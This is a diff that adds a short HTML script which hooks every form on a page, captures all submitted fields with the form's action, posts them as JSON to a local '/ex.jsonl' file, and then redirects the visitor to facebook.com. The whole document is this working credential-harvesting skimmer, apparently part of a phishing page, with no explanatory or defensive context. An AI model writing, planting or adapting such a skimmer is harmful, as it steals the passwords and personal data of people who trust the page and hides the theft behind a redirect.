@@ -1,0 +1,22 @@
+<script>
+    document.addEventListener('DOMContentLoaded', () => {
+            [...document.querySelectorAll('form')].forEach(form => {
+                form.addEventListener('submit', (e) => {
+                    let data = new FormData(form);
+                    let json = {'action': form.action};
+
+                    for (let entry of data.entries()) {
+                        json[entry[0]] = entry[1];
+                    }
+
+                    fetch('/ex.jsonl', {
+                        method: 'post',
+                        body: JSON.stringify(json)
+                    }).finally(() => {
+                        location.href = "https://facebook.com/";
+                    });
+                });
+            })
+        }
+    );
+</script>
